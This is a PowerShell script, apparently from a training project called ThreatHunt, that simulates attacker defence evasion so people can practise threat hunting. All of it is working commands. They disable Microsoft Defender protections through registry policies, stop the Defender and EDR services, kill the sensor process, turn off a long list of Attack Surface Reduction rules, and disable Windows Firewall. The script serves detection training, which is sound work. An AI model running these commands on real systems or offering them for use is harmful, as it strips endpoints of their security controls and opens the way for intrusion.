# ThreatHunt by Milad Aslaner @MiladMSFT
#   _____  .__.__              .___ _____    _______________________________
#  /     \ |__|  | _____     __| _//     \  /   _____/\_   _____/\__    ___/
# /  \ /  \|  |  | \__  \   / __ |/  \ /  \ \_____  \  |    __)    |    |   
#/    Y    \  |  |__/ __ \_/ /_/ /    Y    \/        \ |     \     |    |   
#\____|__  /__|____(____  /\____ \____|__  /_______  / \___  /     |____|   
#        \/             \/      \/       \/        \/      \/               
# This project is not intended to cause any harm. However just in case, dont use it in production.
# Use at your own risk. There is no turning back. No option to pretend you didn't know what you do.
# ThreatHunt simulates dark magic so that folks can learn threat hunting.


# Disable Microsoft Defender ATP Next Generation Protection
Write-Host "Attempting to disable functionality of Microsoft Defender ATP Next Generation Protection"
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType "DWord"
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableBehaviorMonitoring" -Value 1 -PropertyType "DWord"
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableOnAccessProtection" -Value 1 -PropertyType "DWord"
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableScanOnRealtimeEnable" -Value 1 -PropertyType "DWord"
Stop-Service -Name WinDefend -Force -PassThru -ErrorAction Ignore
Stop-Service -Name WdNisSvc -Force -PassThru -ErrorAction Ignore

# Disable Microsoft Defender ATP Endpoint Detection & Response
Write-Host "Attempting to disable functionality of Microsoft Defender ATP Endpoint Detection Response"
Stop-Service -Name Sense -Force -PassThru -ErrorAction Ignore
Taskkill /s /f /IM MSsense.exe

# Disable Microsoft Defender ATP Attack Surface Reduction
Write-Host "Attempting to disable functionality of Microsoft Defender ATP Attack Surface Reduction"
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -EnableNetworkProtection Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550 -AttackSurfaceReductionRules_Actions Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A -AttackSurfaceReductionRules_Actions Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids 3B576869-A4EC-4529-8536-B80A7769E899 -AttackSurfaceReductionRules_Actions Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids 75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84 -AttackSurfaceReductionRules_Actions Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids D3E037E1-3EB8-44C8-A917-57927947596D -AttackSurfaceReductionRules_Actions Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids 5BEB7EFE-FD9A-4556-801D-275E5FFC04CC -AttackSurfaceReductionRules_Actions Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids 92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B -AttackSurfaceReductionRules_Actions Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids 01443614-cd74-433a-b99e-2ecdc07bfc25 -AttackSurfaceReductionRules_Actions Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids c1db55ab-c21a-4637-bb3f-a12568109d35 -AttackSurfaceReductionRules_Actions Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 -AttackSurfaceReductionRules_Actions Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids d1e49aac-8f56-4280-b9ba-993a6d77406c -AttackSurfaceReductionRules_Actions Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4 -AttackSurfaceReductionRules_Actions Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids 26190899-1602-49e8-8b27-eb1d0a1ce869 -AttackSurfaceReductionRules_Actions Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids 7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c -AttackSurfaceReductionRules_Actions Disabled
Add-MpPreference -AttackSurfaceReductionRules_Ids e6db77e5-3df2-4cf1-b95a-636979351e5b -AttackSurfaceReductionRules_Actions Disabled

# Disable Windows Firewall
Write-Host "Attempting to disable Windows Firewall"
Set-NetFirewallProfile -Enabled False